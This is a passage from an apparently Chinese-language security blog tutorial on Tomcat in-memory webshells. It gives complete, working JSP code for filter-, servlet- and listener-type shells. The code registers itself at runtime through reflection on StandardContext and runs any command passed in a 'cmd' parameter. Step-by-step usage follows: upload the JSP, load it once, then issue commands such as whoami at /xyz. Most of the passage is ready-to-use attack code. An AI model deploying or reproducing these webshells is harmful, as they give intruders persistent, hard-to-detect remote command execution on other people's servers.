</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = servletRequest.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd!= <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//从org.apache.catalina.core.ApplicationContext反射获取context方法</span></span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    Field Configs = standardContext.getClass().getDeclaredField(<span class="string">"filterConfigs"</span>);</span><br><span class="line">    Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    String name = <span class="string">"filterDemo"</span>;</span><br><span class="line"><span class="comment">//判断是否存在filterDemo1这个filter，如果没有则准备创建</span></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="comment">//定义一些基础属性、类名、filter名等</span></span><br><span class="line">        filterDemo filter = <span class="keyword">new</span> filterDemo();</span><br><span class="line">        FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加filterDef</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/*</span></span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        <span class="comment">// filterMap.addURLPattern("/*");</span></span><br><span class="line">        filterMap.addURLPattern(<span class="string">"/xyz"</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加我们的filterMap到所有filter最前面</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射创建FilterConfig，传入standardContext与filterDef</span></span><br><span class="line">        Constructor constructor = ApplicationFilterConfig<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredConstructor</span>(<span class="title">Context</span>.<span class="title">class</span>, <span class="title">FilterDef</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将filter名和配置好的filterConifg传入</span></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.write(<span class="string">"Inject success!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        out.write(<span class="string">"Injected!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>首先访问1.jsp成功注入内存：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/1.png" alt></p><p>再访问/xyz?cmd=whoami触发，就能得到命令执行的结果：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/2.png" alt></p><h3 id="02-踩坑"><a href="#02-踩坑" class="headerlink" title="02 踩坑"></a>02 踩坑</h3><p>使用IDEA复制完整内存马时，需要导入库都无法导入，显示不存在。简单的解决方法：复制tomcat目录下的lib文件夹中的<strong>全部jar包</strong>（因为不知道具体方法躲在哪个jar包中）至项目目录中，然后右键选择 ”add as libraries“导入到项目即可：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/3.png" alt></p><h2 id="0x01-Servlet型内存马"><a href="#0x01-Servlet型内存马" class="headerlink" title="0x01  Servlet型内存马"></a>0x01  Servlet型内存马</h2><h3 id="00-原理-1"><a href="#00-原理-1" class="headerlink" title="00 原理"></a>00 原理</h3><p>类比filter，在filter型中我们需要在<strong>doFilter方法中填入恶意代码</strong>；在servlet中，我们需要在<strong>service方法中填入恶意代码</strong>，每次访问就会触发命令执行。在service填入RuntimeExec和回显的部分，这个<strong>servlet就变成了进行命令执行的木马</strong></p><h3 id="01-实现-1"><a href="#01-实现-1" class="headerlink" title="01 实现"></a>01 实现</h3><h4 id="Servlet部分"><a href="#Servlet部分" class="headerlink" title="Servlet部分"></a>Servlet部分</h4><p>首先看一个简单的servlet的结构： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletDemo</span> <span class="keyword">implements</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//当Servlet第一次被创建对象时执行该方法,该方法在整个生命周期中只执行一次</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"init"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对客户端响应的方法,该方法会被执行多次，每次请求该servlet都会执行该方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"service"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当Servlet被销毁时执行该方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"destroy"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//当停止tomcat时销毁servlet。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Servlet型内存马实现之Servlet部分，在service方法填入RuntimeExec和回显的部分，触发命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServletDemo</span> <span class="keyword">implements</span> <span class="title">Servlet</span></span>&#123;   </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;    <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String cmd = servletRequest.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="动态注册部分-1"><a href="#动态注册部分-1" class="headerlink" title="动态注册部分"></a>动态注册部分</h4><p>获取context部分与filter中相同,仍然从org.apache.catalina.core.ApplicationContext反射获取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure><p> 然后这次需要将上文写的servlet封装成wrapper再使用context添加：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将恶意servlet封装成wrapper添加到StandardContext的children当中</span></span><br><span class="line">ServletDemo demo = <span class="keyword">new</span> ServletDemo();</span><br><span class="line">org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper();</span><br><span class="line">demoWrapper.setName(<span class="string">"xyz"</span>);</span><br><span class="line">demoWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">demoWrapper.setServlet(demo);</span><br><span class="line">demoWrapper.setServletClass(demo.getClass().getName());</span><br><span class="line">standardContext.addChild(demoWrapper);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置ServletMap将访问的URL和wrapper进行绑定</span></span><br><span class="line">standardContext.addServletMapping(<span class="string">"/xyz"</span>, <span class="string">"xyz"</span>);</span><br><span class="line">out.println(<span class="string">"inject servlet success!"</span>);</span><br></pre></td></tr></table></figure><p> servlet型的内存马无法使所有请求都经过恶意代码，只有访问我们设定的url才能触发 </p><h4 id="完整Servlet内存马"><a href="#完整Servlet内存马" class="headerlink" title="完整Servlet内存马"></a>完整Servlet内存马</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationContext"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.StandardContext"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.io.IOException"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.lang.reflect.Field"</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ServletDemo</span> <span class="keyword">implements</span> <span class="title">Servlet</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;    <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            String cmd = servletRequest.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    ServletDemo demo = <span class="keyword">new</span> ServletDemo();</span><br><span class="line">    org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper();</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置Servlet名等</span></span><br><span class="line">    demoWrapper.setName(<span class="string">"xyz"</span>);</span><br><span class="line">    demoWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    demoWrapper.setServlet(demo);</span><br><span class="line">    demoWrapper.setServletClass(demo.getClass().getName());</span><br><span class="line">    standardContext.addChild(demoWrapper);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置ServletMap</span></span><br><span class="line">    standardContext.addServletMapping(<span class="string">"/xyz"</span>, <span class="string">"xyz"</span>);</span><br><span class="line"><span class="comment">//standardContext.addServletMappingDecoded("/xyz", "xyz");</span></span><br><span class="line">    out.println(<span class="string">"inject servlet success!"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>使用方法同上，最终jsp文件将其命名为2.jsp，然后只需<strong>传到web目录并访问一次jsp文件，然后再将/2.jsp换成/xyz?cmd=whoami</strong>访问即可：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/4.png" alt></p><p>提示注入成功，访问路径触发命令执行：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/5.png" alt></p><h3 id="02踩坑"><a href="#02踩坑" class="headerlink" title="02踩坑"></a>02踩坑</h3><p>我用的是Tomcat9环境，使用上面的“standardContext.addServletMapping(“/xyz”, “xyz”);”语句会报错，得用下面的Decoded的方法“standardContext.addServletMappingDecoded(“/xyz”, “xyz”);”，才能执行成功：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/7.png" alt></p><h2 id="0x02-Listener型内存马"><a href="#0x02-Listener型内存马" class="headerlink" title="0x02 Listener型内存马"></a>0x02 Listener型内存马</h2><h3 id="00-实现"><a href="#00-实现" class="headerlink" title="00 实现"></a>00 实现</h3><h4 id="Listener部分"><a href="#Listener部分" class="headerlink" title="Listener部分"></a>Listener部分</h4><p>普通Listener结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Initialized."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Destroyed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 在Listener中，我们需要在<strong>初始化操作contextInitialized中填入恶意代码</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        String cmd = servletRequestEvent.getServletRequest().getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmd != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完整Listener型内存马"><a href="#完整Listener型内存马" class="headerlink" title="完整Listener型内存马"></a>完整Listener型内存马</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.*"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.annotation.WebServlet"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.http.HttpServlet"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.http.HttpServletRequest"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.http.HttpServletResponse"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        String cmd = servletRequestEvent.getServletRequest().getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmd != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">S servletRequestListener = <span class="keyword">new</span> S();</span><br><span class="line">standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line">out.println(<span class="string">"inject success"</span>);</span><br><span 